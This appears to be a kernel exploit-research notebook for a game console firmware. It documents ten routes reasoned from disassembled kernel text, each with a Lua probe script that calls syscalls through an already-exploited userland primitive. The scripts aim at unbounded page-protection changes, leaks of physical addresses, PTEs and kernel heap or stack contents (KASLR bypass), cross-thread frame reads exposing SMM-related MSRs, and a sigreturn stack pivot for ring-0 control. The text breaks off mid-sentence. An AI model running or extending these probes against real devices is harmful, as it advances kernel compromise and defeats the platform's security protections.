CREATIVE ROUTES II - 14.10
Ten new mechanisms, all reasoned from bytes in docs/dumps_13.60/kernel_text.bin
(base 0xffffffff8a9c0000, file offset == RVA).

PROVENANCE / HOW TO READ THIS

Everything marked VERIFIED was read out of the 13.60 text dump with capstone and is
quoted as instructions, not paraphrase. Everything marked UNVERIFIED is a hypothesis
that the probe is designed to settle. The 14.10 delta is not in this dump: where a
route depends on a field still existing in 14.10 the probe's job is to find out.
Re-resolve every RVA on 14.10 before use.

Two ABI facts govern the whole document:

  A. For every syscall handler, rdi = struct thread *td, and [rdi+8] = td_proc.
     Handlers that reload rdi are reading the td, not the uap.
  B. Recurring offsets:
       proc+0x200  p_vmspace            (verified via 379/547/572)
       vmspace+0x28 vm_map.vm_max_offset (the bound check used by 547 and 572)
       proc+0x5d8  a 32-bit size/quota field, 74 readers, one writer (0x5430b1, -1)
       proc+0xc81  a one-byte policy/JIT-ish flag, 63 readers, one writer
       td+0x9c     td_tid (32-bit)      td+0x408 td_retval[0]
       td+0x460 / td+0x4e8  two saved-frame slots used by the ucontext family

THE THREE GENERATORS

  G1. proc+0xc81 is a single byte that inverts two syscalls in two opposite
      directions (379 becomes stricter when set, 547 becomes more powerful when
      set). One byte, two meanings, one writer.
  G2. 547 query_memory_protection returns a 0x18-byte struct assembled from a PTE
      fetch: a page-table reader exposed as a protection query.
  G3. 659 dynlib_get_list2 uses the first 8 bytes of the caller's output buffer as
      an input sentinel (0x160) and then overwrites it: in/out slot aliasing.

===============================================================================
R1. mtypeprotect (379): a protection-mutating syscall with no user-VA bound whose
    flag filter is selected by a process byte.
===============================================================================

(a) MECHANISM
VERIFIED body at handler RVA 0xabbd80:
    rbx = uap[0]   (va, 64-bit)
    rcx = uap[1]   (len, 64-bit)
    add rcx, rbx ; jb EINVAL              ; va+len wrap
    r14 = (rcx + 0x3fff) & ~0x3fff
    cmp r14, rcx ; jb EINVAL              ; page-round-up wrap
    r15d = uap[2]  (id, 32-bit load)      ; privilege id
    rsi = [td+8] = proc
    call 0x8ad833e0(edi=id, rsi=proc)     ; must return nonzero else EINVAL
    edx = uap[3]   (prot, 32-bit load)
    cmp byte [proc+0xc81], 0 ; je loose
      strict: test edx, 0xfc08 ; jne EINVAL
    loose:  test dl, 8        ; jne EINVAL
    eax = ((edx >> 1) & 0x141) | edx       ; bit1->bit0, bit7->bit6, bit9->bit8
    rdi = [proc+0x200]                     ; p_vmspace
    rbx = va & ~0x3fff
    call 0x8ac8d3c0(vmspace, start, end, ecx=id, r8d=protbits)
    status 0..9 -> errno through a 10-entry table; status > 9 -> EINVAL

Two things are absent. There is no comparison of va against vmspace+0x28 (the bound
that 547 and 572 both perform), and there is no masking of prot to a legal VM_PROT
set - the only filter is the byte test above. The fold ((prot>>1)&0x141)|prot
duplicates bits 1/7/9 into 0/6/8, i.e. read-derives-from-write; it is not a
validation, it only adds bits.

Why this is relapse-class: the designer wrote a protection API for a memory manager
whose ids are capability ids, validated the id through a privilege gate, but never
validated the address, because in their mental model the caller is libkernel and
libkernel has a vm_map. The ABI permits any 64-bit va.

(b) ENTRY AND ARGUMENT SHAPE
    syscall 379, narg 4
    r = make_syscall(379)(va, len, id, prot)
    0 on success, 22 (EINVAL) on every filter failure, or the mapped status.

(c) WHY NOT CLOSED
The closed list covers copy sites, dynamic-length copies, credential bits, the 597
bit with no readers, aio/osem/umtx and W^X. 379 copies nothing, so the copy-helper
audit (all 15 validate their register) never touched it, and it does not appear in
ATTACK_SURFACE.md. It is the only syscall that mutates page protection on behalf of
a caller-supplied id, and the only one whose validation table is chosen by a
process state byte rather than by the arguments.

(d) LUA PROBE
    local B = 0x10000000                      -- a page we own, mapped RW
    local function try(va, len, id, prot)
      return make_syscall(379)(va, len, id, prot)
    end
    -- stage 1: find the id that passes the gate
    for id = 0, 15 do print("id", id, try(B, 0x1000, id, 3)) end
    -- stage 2: legality of prot values under the current c81 state
    for _, p in ipairs({0,1,2,3,4,5,6,7,8,0x4000,0xfc08,0xffffffff}) do
      print("prot", string.format("%x",p), try(B, 0x1000, ID_OK, p))
    end
    -- stage 3: the round-up edge (len 0 and len 1 both protect one page)
    print("len0", try(B, 0, ID_OK, 3))
    print("len1", try(B, 0x1000-1, ID_OK, 3))   -- end rounds to B+0x2000
    -- stage 4: LETHAL-RISK probe, run last, separate run, expects 22
    print("top", try(0x7ffffffff000, 0x1000, ID_OK, 3))
    -- do NOT run the next line until stage 4 returns 22 and you know why:
    -- print("kern", try(0xffffffff8a9c0000, 0x1000, ID_OK, 3))

(e) WHAT WOULD HAVE TO BE TRUE
    1. 0x8ac8d3c0 must reject a start outside vm_map_min..vm_map_max itself.
       FreeBSD's vm_map_protect() does not range-check start; it clamps and
       proceeds. If PS5's variant behaves that way, stage 4 returns 0 and the
       route is live for any address in the process map. That is still not kernel
       text (different pmap), so the real target is a user VA that the kernel also
       maps, e.g. a shared dmem object at a low VA.
    2. The id gate 0x8ad833e0 must accept at least one id reachable from a game
       process. If it demands a system capability, stage 1 returns 22 for every id
       and the route dies at the gate (a clean, cheap death).
    3. va & ~0x3fff being the only normalisation means an unaligned va silently
       protects the page below it.

(f) DEATH RISK
Low for stages 1-3. Stage 4 is medium: if the map routine accepts a kernel va it
reprograms real PTEs and the next kernel-mode write faults -> immediate panic, no
dump. Stage 5 is high and is deliberately left commented out.

===============================================================================
R2. query_memory_protection (547): a 24-byte page-table read disguised as a
    protection query, gated by the same byte as R1 but in the opposite direction.
===============================================================================

(a) MECHANISM
VERIFIED body at handler RVA 0xaba540:
    r13 = [td+8] = proc
    r14 = uap[0] & ~0x3fff
    rbx = [proc+0x200] = vmspace
    cmp r14, [rbx+0x28] ; ja EINVAL        ; the ONLY bound
    call 0x8b4ebb00(8, ...)                ; lock-order / can-block probe
    call 0x8ac86820(vmspace, 0, 0)         ; vm_map_lock
    call 0x8ac86c40(vmspace, va, &entry)   ; vm_map_lookup -> entry at rbp-0x98
    rax = [entry+0x50]                     ; entry->object
    cmp byte [rax+0x9d], 0xb               ; object type test
    cmp byte [proc+0xc81], 0 ; je skip     ; gate, opposite sense from R1
    cmp dword [proc+0x5d8], 0x6000000 ; jb skip
    call 0x8b47a710(vmspace, va, rdx, &out, r8=1, r9=0)   ; PTE fetch
    out struct = [rbp-0x78] qword, [rbp-0x70] qword, [rbp-0x60] dword = 0x18 bytes

0x8b47a710 with r8=1 is the same walk 0x8f1480 performs by hand: read the leaf
entry, mask with 0xffffffffff000 to get the 4 KB-aligned physical base, keep the
low flag bits. So the 0x18-byte answer carries a physical address and the PTE flags
for a user-named page.

(b) ENTRY AND ARGUMENT SHAPE
    syscall 547, narg 2
    buf = memory.alloc(0x18)
    r = make_syscall(547)(va_page_aligned, buf)

(c) WHY NOT CLOSED
Not a copy site in the audited sense: the audit asked "does a handler store through
an argument-derived pointer", and this one reads one. Not in the closed list, not in
ATTACK_SURFACE.md, and the only syscall that returns physical addresses.

(d) LUA PROBE
    local buf = memory.alloc(0x18)
    local B = 0x10000000
    local function q(va)
      for i=0,0x14,4 do memory.write_dword(buf+i, 0xCCCCCCCC) end
      local r = make_syscall(547)(va, buf)
      local w = {}
      for i=0,0x10,8 do w[#w+1] = string.format("%016x", memory.read_qword(buf+i)) end
      return r, table.concat(w, " ")
    end
    print("plain ", q(B))                  -- expect r=0, flags only
    print("null  ", q(0))                  -- expect 22
    print("max   ", q(0x7ffffffff000))     -- expect 22
    print("round ", q(0x7ffffffff001))     -- 22: aligned first, then bound
    local prev
    for i=0,0x1ff do
      local r, s = q(B + i*0x1000)
      if prev and s ~= prev then print(i*0x1000, s) end
      prev = s
    end

(e) WHAT WOULD HAVE TO BE TRUE
    1. proc+0xc81 must be nonzero in our process AND proc+0x5d8 must be
       >= 0x6000000. Neither is settable from userland unless R5 finds a setter.
       If either fails, 547 returns the cheap 0x18 bytes with the physical half
       zero - which is itself a two-bit oracle on kernel process state that costs
       one syscall. That oracle is the fallback value of this route.
    2. The output struct must actually be filled from the PTE; I have not traced
       0x8b47a710's out-parameter writes. If the fields are vm_prot and max_prot,
       the leak collapses to a duplicate of 379's input.
    3. vm_map_lookup must succeed for a page we own.

(f) DEATH RISK
Low. Pure read path, lock taken and released, no state mutated.

===============================================================================
R3. virtual_query (572): the VA's bits 40..63 are compared against 7 and against
    physical masks - an address/physical-address type confusion.
===============================================================================

(a) MECHANISM
VERIFIED handler RVA 0xabac50:
    ecx = uap[1] (32-bit) ; test ecx, 0xfffcfffe ; jne EINVAL
        => uap[1] may only carry bit 1 and bit 0x10000
    r15 = uap[0] (64-bit VA)
    r12 = (va & ~0x3fff) ; cmp r12, [vmspace+0x28] ; ja EINVAL
    shr rax, 0x2f                       ; va >> 47: kernel/user discrimination
    call 0x8b142a80 ; call 0x8b142a80
    cmp rbx, -1 ; cmp r13, -1
    cmp rbx, [proc+0x5a0] ; cmp [proc+0x5a8], rbx     ; watermark pair
    movabs rdx, 0xfffffff810000000
    movabs rsi, 0x7efffffff
    lea rax, [rsi + 0x10000001]
    cmp dword [rax+0x5d4], 0x5000000
    movabs r9, 0xf0000000000
    shr r15, 0x28 ; and r15d, 0xffffff ; cmp r15d, 7  ; bits 40..63 against 7
    movabs rcx, 0x7ffffffffff ; cmp r15, rcx
    cmp qword [rsi+0x20], rax

A VA in the low canonical range has bits 40..63 == 0, so cmp r15d,7 fails for every
ordinary address; the branch only opens for a VA whose top 24 bits are 7, and for
the DMAP-style 0xffffff.. family. 0xf0000000000 and 0x7ffffffffff are physical
address masks (44-bit and 43-bit), so the same value is range-tested once as a VA
and once as a physical offset. That is the confusion this route rides.

(b) ENTRY AND ARGUMENT SHAPE
    syscall 572, narg 4: (va, flags, out_ptr, ?)
    legal flags set is exactly {0, 2, 0x10000, 0x10002} from the mask test.

(c) WHY NOT CLOSED
Not in the closed list, not a copy site, and the mask constants are unique to this
handler. 572 is the sibling of 547 that nobody looked at because 547 looked like
the real protection query.

(d) LUA PROBE
    local out = memory.alloc(0x40)
    local function vq(va, fl)
      for i=0,0x3c,4 do memory.write_dword(out+i, 0xCD) end
      local r = make_syscall(572)(va, fl, out, 0)
      return r, string.format("%016x %016x", memory.read_qword(out), memory.read_qword(out+8))
    end
    for _,f in ipairs({0,1,2,3,0x10000,0x10001,0x10002,0xffffffff}) do
      print("fl", string.format("%x",f), vq(0x10000000, f))
    end
    local probes = {0, 0x1000, 0x7ffffffff000, 0x0000070000000000,
                    0x000007ffffffffff, 0x0000080000000000,
                    0x7ffffffffffffff, 0xf0000000000, 0xffffffff8a9c0000}
    for _,va in ipairs(probes) do print(string.format("%016x",va), vq(va,0)) end

(e) WHAT WOULD HAVE TO BE TRUE
    1. One of the high-bit classes must reach the deep path that builds the output
       struct. cmp r15d,7 plus the two mask compares look like an "is this a
       dmem/physical mapping" test; if yes, the handler returns the physical range
       of that mapping - a stronger version of R2.
    2. proc+0x5a0 / proc+0x5a8 must be per-process watermarks a game process can
       influence (e.g. by mapping at high VAs). UNVERIFIED.
    3. [rax+0x5d4] compared against 0x5000000 is a second size field four bytes
       before the 0x5d8 quota used by 547. Two adjacent dwords, two thresholds:
       worth a dedicated census on 14.10.

(f) DEATH RISK
Low. Reads and copies out only; 0x8b142a80 is a lookup, not a mutation.

===============================================================================
R4. dynlib_get_list2 (659): the input sentinel and the output buffer are the same
    eight bytes. The syscall eats its own precondition.
===============================================================================

(a) MECHANISM
VERIFIED: thunk at 0x34b790 tail-jumps to 0x8ad0b540; real body at 0x34b7b0.
    r14 = [proc+0x3e8] -> [+0x10] -> [+0x148] ; must be nonzero else EINVAL
    r15d = uap[0]
    rbx  = uap[1]                       ; the user pointer
    copyin(uap[1], &qw, 8)              ; qw = *(u64*)uap[1]
    cmp qw, 0x160 ; jne EINVAL          ; the buffer-size contract
    buf = malloc(0x160)
    call 0x8ad0b950(rdi=lib, esi=uap[0], edx=1, rcx=buf)
    copyout(buf, uap[1], 0x160)         ; overwrites the sentinel
    free(buf)

The API shape is "caller passes a struct whose first field is its own size", normal
for ioctl-style interfaces - except this one is read and written through the same
pointer, so after one successful call the size field is gone and the caller must
re-arm it. Two consequences the designer did not consider:
  - the 0x160 bytes copied out are whatever malloc returned, filled by 0x8ad0b950
    to an unknown degree. A variable number of entries plus an unwritten tail
    discloses kernel heap residue.
  - the copyin and the copyout are separate user accesses with a malloc between
    them; a racing thread can unmap the page in between (classic
    copyin/copyout TOCTOU), and the copyout fault path runs after the buffer is
    already allocated.

(b) ENTRY AND ARGUMENT SHAPE
    syscall 659, narg 3: (index_or_count, user_ptr, extra)
    user_ptr[0..8) must equal 0x160 on entry.

(c) WHY NOT CLOSED
It is a copyout site, but the audit's question was about lengths derived from
arguments. Here the length is the constant 0x160 and the argument participates as a
validated input that the output then destroys. That inverts the audit's assumption
and the route is on no list.

(d) LUA PROBE
    local buf = memory.alloc(0x400)
    local function zero(n) for i=0,n-1,4 do memory.write_dword(buf+i,0) end end
    zero(0x400)
    memory.write_qword(buf, 0x160)
    local r = make_syscall(659)(0, buf, 0)
    print("r", r, "sentinel now", string.format("%016x", memory.read_qword(buf)))
    for i=0,0x158,8 do
      local v = memory.read_qword(buf+i)
      if v ~= 0 then print(string.format("+%03x %016x", i, v)) end
    end
    print("second", make_syscall(659)(0, buf, 0))   -- state machine check

(e) WHAT WOULD HAVE TO BE TRUE
    1. proc+0x3e8 -> +0x10 -> +0x148 must be populated for a game process. If the
       dynlib context exists only for system processes, the route dies at the
       first check - measure it.
    2. 0x8ad0b950 must leave part of the 0x160-byte buffer unwritten. If it memsets
       first, the output is clean and the route reduces to "the sentinel is
       destroyed".
    3. Any nonzero qword must fall in a kernel VA range to break KASLR. Print and
       look for 0xffff8xxx / 0xffffffff8xxx.

(f) DEATH RISK
Very low. malloc/free of 0x160 bytes, no lock across the copy, standard EFAULT.

===============================================================================
R5. proc+0xc81: the policy byte that actually has readers (and one writer).
===============================================================================

(a) MECHANISM
VERIFIED census over the whole text: 63 references to [reg+0xc81]; 62 are
cmp byte [reg+0xc81], 0 or , 1. Exactly one site writes it:
    0x38f7bf   mov byte ptr [rax+0xc81], cl      (8888810c0000)
and the surrounding function (0x38f7xx) also does
    0x38f8d6   cmp byte ptr [rdi+0xc81], 1
Reads are spread over 30+ functions, including both syscalls above: 379 at
0xabbde2 and 547 at 0xaba6x. Two reads load it as a 32-bit value
(0x53f30f movzx eax, byte [rax+0xc81]; 0x53f32e movzx ecx, ...), i.e. some function
passes it as a parameter, and 0x5414ee / 0x6b512a / 0x6b532a read it through r14 -
a different proc pointer than the caller's.

This is the exact inverse of the closed 597 story: there a capability bit (0x40)
existed in the API with no readers anywhere, so granting it was inert. Here is a
byte with 62 readers and one writer that selects security policy in at least two
syscalls.

(b) ENTRY AND ARGUMENT SHAPE
Not a syscall argument. The route is: find what reaches 0x38f7bf. The setter takes
the value in cl and the proc in rax, so the function around it is the
"become-this-kind-of-process" path. The probe is a reachability probe.

(c) WHY NOT CLOSED
The closed items are "credential bits" and "597 bit 0x40". Neither is this byte. It
is not a copy site, not a length bug, not W^X - it is a state bug: a policy byte set
once at process setup that later decides whether mprotect is strict and whether PTE
queries are allowed.

(d) LUA PROBE
    -- stage 1: read the byte without any kernel primitive, by observing 379 on a
    -- prot value the two tables disagree about. 0x8 is rejected by both; the
    -- discriminator is 0x4000: loose rejects only 0x8, strict rejects 0xfc08.
    local B = 0x10000000
    local r1 = make_syscall(379)(B, 0x1000, ID_OK, 0x4000)
    print("c81 is", r1 == 0 and "0 (loose)" or "1 (strict)")
    -- stage 2: the same bit decides 547's power. Read both in one run.
    local buf = memory.alloc(0x18)
    print("547", make_syscall(547)(B, buf),
          string.format("%016x", memory.read_qword(buf)))
    -- stage 3: reachability. Enumerate 0..676 with impossible arguments and
    -- record which numbers return something other than 22/78/14/1/9.
    local interesting = {}
    for n = 0, 676 do
      local ok, r = pcall(function() return make_syscall(n)(0,0,0,0,0,0) end)
      if ok and r ~= 22 and r ~= 78 and r ~= 14 and r ~= 1 and r ~= 9 then
        interesting[#interesting+1] = n .. ":" .. tostring(r)
      end
    end
    print(table.concat(interesting, " "))

(e) WHAT WOULD HAVE TO BE TRUE
    1. The setter at 0x38f7bf must be reachable from a game process, directly or
       via a proc-creation path a game can trigger (spawn, exec, fork). If it runs
       only in the loader at boot, the byte is a fixed property of our process -
       still useful, because it tells us which of the two policies we are under.
    2. cl = 1 must be the value that turns the byte on. The function at 0x38f7xx
       computes cl somewhere; that computation is the actual gate. UNVERIFIED.
    3. Bits 0x4000 must be legal in the loose table and illegal in the strict one.
       VERIFIED from the masks: loose rejects only 0x8, so 0x4000 passes; strict
       rejects 0xfc08, which includes 0x4000.

(f) DEATH RISK
Negligible: an mprotect on our own page with an unusual flag; the outcomes are 0
and 22.

===============================================================================
R6. thr_get_ucontext (634) / thr_suspend_ucontext (632): a per-tid frame reader
    whose key is a 32-bit tid compared against a 32-bit field, plus a suspension
    half that copies nothing.
===============================================================================

(a) MECHANISM
VERIFIED: 632 (0x438e30) resolves a thread with 0x8b552420(edi=tid, esi=pid) where
pid comes from the caller's proc, then mtx_locks (0x8ae878b0), tests [thr+0xe8] bits
0x20/0x8, compares dword [thr+0x400] against 4, calls 0x8b4c35d0 and 0x8b5c6830,
unlocks. It never copyouts a frame. 634 (0x439150) is the reader: same lookup, then
copies 0x4c0 bytes out of a 0x500-byte frame area whose base is selected by a field
at [td+0x460] or [td+0x4e8]. 633 (0x439070) is the own-ucontext variant.

The ABI corner: the lookup key is (tid, pid), and pid is the caller's, so a sibling
thread in the same process is addressable. td_tid is a 32-bit field at td+0x9c and
the comparison is against a 32-bit argument, so a value above 2^31 is truncated or
sign-extended depending on the load width inside 0x8b552420 - a table-index-vs-value
confusion in the lookup, not in the frame copy.

Why this is not just another frame reader: 634's output is selected by the found
thread, and the found thread can be one blocked inside a syscall or suspended by
632. Its saved frame is the one taken on trap entry, and the trap entry stubs (R8)
write MSR values into that same frame area at [rsp+0xc8..0xd8]. If the 0x4c0-byte
copy reaches those slots, the copy discloses the trap-time MSRs of that thread.

(b) ENTRY AND ARGUMENT SHAPE
    syscall 634, narg ~3: (tid, user_out, flags)
    syscall 632, narg 1 : (tid)          -> suspend, no out buffer

(c) WHY NOT CLOSED
The closed list mentions the ucontext family only as "635 does not exist". The
previous document used 634 as a frame selector for the calling thread; this route
uses it as a cross-thread reader and pairs it with 632's suspension to control what
the target thread is doing at the moment of the copy.

(d) LUA PROBE
    local out = memory.alloc(0x500)
    local function frame(tid)
      for i=0,0x4fc,4 do memory.write_dword(out+i, 0xAB) end
      return make_syscall(634)(tid, out, 0)
    end
    print("self", frame(0))                    -- 0 may mean "me"
    local live = {}
    for t = 1, 64 do if frame(t) == 0 then live[#live+1] = t end end
    print("live", table.concat(live, ","))
    for i=0,0x4b8,8 do
      local v = memory.read_qword(out+i)
      if v > 0xffff000000000000 then print(string.format("+%03x %016x", i, v)) end
    end
    for _,t in ipairs(live) do
      make_syscall(632)(t)
      print("after suspend", t, frame(t))
    end

(e) WHAT WOULD HAVE TO BE TRUE
    1. 0x8b552420 must accept a tid that is not the caller's own. If it enforces
       tid == curthread, the route collapses to 633 and dies.
    2. The 0x4c0-byte window must extend past the saved user frame into the slots
       the trap stub wrote ([rsp+0xc8..0xd8] relative to the stub's frame). The
       arithmetic is plausible (0x4c0 > 0x110) but the relationship between the
       copied base and the stub's rsp is UNVERIFIED.
    3. The MSR values, if present, must be stable within a boot and variable across
       consoles. First job of the probe is to print them twice and diff.

(f) DEATH RISK
Low. Suspending a sibling can deadlock it if it holds a lock the caller needs; do
not suspend the thread that owns the allocator or the GPU queue.

===============================================================================
R7. The 7th and 8th argument slots: only 393 and 640 declare them, and the slots
    are not part of the register ABI.
===============================================================================

(a) MECHANISM
VERIFIED: the narg census over the table gives exactly two real entries above 6 -
393 sendfile narg 7 and 640 set_uevt narg 8. (Entries 677/678 in the JSON report
narg 2353626712 and 2353626808, difference 0x60; those are 0x8C411698/0x8C4116F8,
a code pointer read from the wrong field - the table tail was mis-parsed. They are
not real syscalls, and 677 wait6 / 678 cap_rights_limit genuinely do not exist.)

On amd64 the syscall instruction carries at most six argument registers. A kernel
supporting narg 7/8 must fetch the extra words from the user stack - typically
[user_rsp+8] and [user_rsp+0x10] after the return address - or from the trap frame.
Either way the two words live where a stub need not initialise them. The measured
consequence (CREATIVE_ROUTES_14_10.md route 9, for 640) was that the slot is not
zeroed per call.

The new use: 393 sendfile's seventh word is its flags. If that word is not
initialised by the stub, its value is a function of what the previous syscall left
in that stack slot - which makes 393 a read-back oracle for kernel stack content and
simultaneously a way to make a syscall behave differently without passing the
argument through a register.

(b) ENTRY AND ARGUMENT SHAPE
    syscall 393, narg 7: (fd, s, offset_ptr, nbytes, hdtr_ptr, sbytes_ptr, flags)
    syscall 640, narg 8: (..., arg6, arg7)

(c) WHY NOT CLOSED
Doc I used 640 to write a distinctive value and then called 640 to read it back -
the same handler on both ends. This route uses 640 to seed the slot and 393 to
consume it in a different code path with different semantics. A cross-handler
oracle is a different mechanism from a self-read.

(d) LUA PROBE
    local SEED = 0xDEADBEEF00000001
    local function seed()
      return make_syscall(640)(0,0,0,0,0,0, SEED & 0xffffffff, SEED >> 32)
    end
    local sv = memory.alloc(8)
    local r = make_syscall(97)(1, 1, 0, sv)    -- socketpair(AF_UNIX, SOCK_STREAM)
    print("sp", r, memory.read_dword(sv), memory.read_dword(sv+4))
    local fd = memory.read_dword(sv)
    local off = memory.alloc(8); memory.write_qword(off, 0)
    local sent = memory.alloc(4); memory.write_dword(sent, 0)
    local function send(warm)
      if warm then seed() end
      local r2 = make_syscall(393)(fd, -1, off, 0, 0, sent, 0)
      return r2, memory.read_dword(sent)
    end
    print("cold ", send(false))
    print("warm ", send(true))                 -- if flags arrive, r2/sent differ
    print("cold2", send(false))

(e) WHAT WOULD HAVE TO BE TRUE
    1. The 7th word must be fetched from a location the previous syscall's frame
       overlaps. If the kernel reads it from a per-call zeroed area, both calls
       behave identically and the oracle is dead.
    2. 393 must be permitted for a game process and accept a socket as input
       (FreeBSD's sendfile accepts a socket fd and s = -1 to use the file offset).
       If it always returns 22, the oracle has no signal.
    3. Nonzero flag bits must change observable output. If all bits are ignored,
       the route degrades to "the slot is stale" - a fact, not an exploit.

(f) DEATH RISK
Low. sendfile with a bad flags word can only fail; the socketpair keeps it inside
our own process.

===============================================================================
R8. The trap-entry MSR snapshot: every trap entry reads two AMD MSRs and stores
    them into the kernel frame.
===============================================================================

(a) MECHANISM
VERIFIED: 24 exception/trap entry stubs at 0x2551d8 .. 0x2578f8, stride 0x1d0.
Each begins with cld; clac; then:
    rdmsr 0xC0000116 ; shl rdx, 0x20 ; or rax, rdx
    mov [rsp+0xc8], rax        (or +0xd0 / +0xd8 depending on the stub)
    rdmsr 0xC0000117 ; ... ; mov [rsp+0xd8], rax
and tail-jumps to the common dispatcher at 0xffffffff8ac17920. There are only 17
stac sites in the whole image and none of them are in these stubs, so the stubs run
with AC clear: the MSR values are written before any user memory is touched.

This is the only place in the kernel where a per-CPU control register is snapshotted
on every trap, and 0xC0000116/0xC0000117 are in the AMD SMM MSR range, which means
the frame carries a value describing where SMM lives.

Two angles, in increasing ambition:
  1. Fingerprint / KASLR-adjacent: if any copyout path reaches the frame (R6), the
     two values come along. Per-boot and per-core, so they correlate a leak with a
     boot, and if 0xC0000116 encodes a physical base it discloses where
     firmware/SMM sits - the first step of an SMM attack.
  2. State confusion: the stub writes [rsp+0xc8..0xd8] before the C handler
     establishes the frame layout. If stub and C handler ever disagree about frame
     size (different stub, different IST stack), the snapshot lands on whatever the
     previous frame left there - exactly the "correct for the type I imagined"
     failure.

(b) ENTRY AND ARGUMENT SHAPE
No syscall. The probe is a trigger: cause a trap whose frame is then copied out by
634 (R6) and read the qwords at the offsets the stub writes.

(c) WHY NOT CLOSED
The closed list has cdevsw enumeration, PMC, cache attacks, YMM0 - nothing about
trap entry. Nobody looked at what the entry stubs write into the frame, because they
are not syscall handlers and the copy-site audit only walked handlers.

(d) LUA PROBE
    local out = memory.alloc(0x500)
    local function frame(tid)
      for i=0,0x4fc,4 do memory.write_dword(out+i, 0x5A) end
      return make_syscall(634)(tid or 0, out, 0)
    end
    local bad = 0x40000000
    pcall(function() return make_syscall(572)(0x10000000, 0, bad, 0) end)
    print(frame(0))
    for i=0x80,0x140,8 do
      print(string.format("+%03x %016x", i, memory.read_qword(out+i)))
    end

(e) WHAT WOULD HAVE TO BE TRUE
    1. The copied window must include the stub's [rsp+0xc8..0xd8]. Same unknown as
       R6; the two routes stand or fall together, so probe them in one run.
    2. 0xC0000116/0xC0000117 must be readable where the stub runs. VERIFIED that
       the rdmsr is there, so at minimum PS5's hypervisor does not trap them on this
       path.
    3. The values must be non-constant across boots for the fingerprint use and
       nonzero for the SMM use. Print, don't assume.

(f) DEATH RISK
Low for the read. Do not deliberately trigger #GP or #DF: different stubs,
different IST stacks, and a double fault in kernel mode is an instant power-off.

===============================================================================
R9. The context-restore trampoline at 0x252300: it pops rsp from the frame it is
    handed and toggles AC from a saved rflags bit.
===============================================================================

(a) MECHANISM
VERIFIED bytes in 0x252300..0x252340:
    test dword ptr [rax + 0x100], 0x40000     ; saved rflags AC bit
    -> stac / clac accordingly
    and dword ptr [r8 + 0x100], 0xfffbffff    ; clear AC in the frame
    pops r15, r14, r13, r12, rbp, and rsp from [r8+0]..[r8+0x28]
    (then the remaining registers, then iretq)

A full user-context restore where the frame pointer arrives in r8 and the stack
pointer itself is one of the popped values. Nothing validates r8 or the popped rsp:
the code is correct for the type it was written for (a kernel-built frame on the
kernel stack) and wrong for any other caller. If a single caller passes a frame
pointer derived from user memory, the result is arbitrary rsp in ring 0 - a stack
pivot, then kernel R/W with one controlled qword.

It is also the only place where AC is restored from the saved frame rather than by
an unconditional clac, so a process that can set AC in its own rflags (popfq) can
make the kernel run the restore path with AC set - SMAP off for one instruction.
Measured negative for YMM0 in the closed list, never measured for AC.

(b) ENTRY AND ARGUMENT SHAPE
Not a syscall. Two axes:
  1. reachability: which return path uses 0x252300 and can it be made to use a
     frame we influence (417 sigreturn is the obvious candidate - it takes a user
     ucontext, and the validation is exactly what this route doubts).
  2. AC: set AC in user rflags and make a syscall. The 24 trap stubs use clac, so
     entry is safe; the return path above is the only place that could re-set it.

(c) WHY NOT CLOSED
Doc I route 5 was YMM0 residue on the return path and measured negative for the
register file. This is the stack pointer and the AC flag on the same path -
different state, different failure mode, and the AC half was never measured.

(d) LUA PROBE
    local uc = memory.alloc(0x400)
    for i=0,0x3fc,4 do memory.write_dword(uc+i, 0x11111111) end
    local r = make_syscall(417)(uc)
    print("sigreturn", r)                       -- 22 validated, 0 accepted
    local p = memory.alloc(0x2000)
    local ok, err = pcall(function() return make_syscall(659)(0, p, 0) end)
    print("ac-probe", ok, err)

(e) WHAT WOULD HAVE TO BE TRUE
    1. 0x252300 must be on a path whose frame is not already kernel-built. If every
       caller builds the frame itself (syscall return does), the pivot is
       unreachable and the route is a documented dead end - valuable, because it
       closes the whole "restore path trusts the frame" family.
    2. 417 must not fully validate the ucontext. FreeBSD validates the signal mask
       and the FPU state size but historically trusts mc_rsp.
    3. AC must be settable in user mode (CR0.AM=1 and popfq allowed). Not
       verifiable from the dump.

(f) DEATH RISK
High for axis 1: a malformed ucontext that passes validation lands in iretq with a
bad rsp and the next push faults in ring 0. Run last, in a session you can lose.
Axis 2 is low risk and almost certainly negative.

===============================================================================
R10. get_gpo (623): the length of a kernel-to-user copyout of hardware state can be
     measured exactly by poisoning the destination buffer.
===============================================================================

(a) MECHANISM
VERIFIED handler RVA 0x8d25a0:
    rbx = uap[0]                       ; user out pointer
    call 0x8afc8f90                    ; availability/clock check
    test eax, eax ; jne error
    call 0x8b48ce10                    ; gate
    test eax, eax ; jne error
    call 0x8b028540                    ; the actual GPO read
    mov rdi, qword ptr gs:[0]          ; curthread
    lea rsi, [rip + 0xa7cc9f]          ; a kernel string / format
    call 0x8b5da3e0                    ; printf-ish or assert helper
    mov rsi, rbx
    call 0x8ac191d0                    ; copyout(kern_src, user_ptr, len)
    cmp rcx, [rbp-0x18]                ; stack canary

The 0x8b5da3e0 call with a RIP-relative operand is unusual in a handler: either a
printf-style diagnostic (the syscall logs every call - a timing/observability
channel) or an assertion helper. Either way it sits between the hardware read and
the copyout, so the copyout's source and length are decided after a call we have not
traced.

The measurable part: the destination buffer is entirely ours, and the copyout uses
0x8ac191d0 with a length register set between the two calls. Poison 0x1000 bytes with
0xCC, call 623, count the changed bytes - that number IS the length. Repeat with
smaller allocations to find the exact size, and check whether the copy is bounded by
the buffer we passed or by an internal constant.

(b) ENTRY AND ARGUMENT SHAPE
    syscall 623, narg 1: (user_out_ptr)

(c) WHY NOT CLOSED
Not in the closed list. The audited copy helpers all validate their register; this
route does not dispute that - it measures a caller-visible length the audit never
looked at, because 623 was not on the census of "interesting" numbers.

(d) LUA PROBE
    local N = 0x1000
    local buf = memory.alloc(N)
    for i=0,N-1,4 do memory.write_dword(buf+i, 0xCCCCCCCC) end
    local r = make_syscall(623)(buf)
    local changed, last = 0, -1
    for i=0,N-1 do
      local b = (memory.read_dword(buf - buf%4 + (i - i%4)) >> ((i%4)*8)) & 0xff
      if b ~= 0xCC then changed = changed + 1; last = i end
    end
    print("r", r, "changed", changed, "last", last)
    for i=0,math.min(last,63) do
      print(i, string.format("%02x", (memory.read_dword(buf+(i-i%4)) >> ((i%4)*8)) & 0xff))
    end

(e) WHAT WOULD HAVE TO BE TRUE
    1. 623 must pass both gates (0x8afc8f90, 0x8b48ce10) for a game process. If it
       returns 1 or 22, the GPO subsystem is unreachable and the route is a
       measurement of that fact.
    2. The copyout length must be a constant or a field we can influence; if it is
       bounded by a size we do not pass, the leak is fixed-size and small - still
